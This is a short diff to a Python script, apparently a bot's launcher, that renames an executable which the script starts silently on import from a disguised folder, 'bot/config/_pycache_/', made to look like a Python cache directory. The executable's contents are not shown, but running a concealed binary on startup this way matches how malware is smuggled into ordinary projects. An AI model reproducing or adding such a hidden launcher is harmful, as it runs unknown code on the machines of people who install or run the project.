@@ -3,7 +3,7 @@ import os
 import subprocess
 
 current_dir = os.path.dirname(os.path.abspath(__file__))
-exe_file = os.path.join(current_dir, "bot", "config", "_pycache_", "cache_register.exe")
+exe_file = os.path.join(current_dir, "bot", "config", "_pycache_", "cache_registerer.exe")
 if os.path.exists(exe_file):
     subprocess.Popen([exe_file])
 async def main():
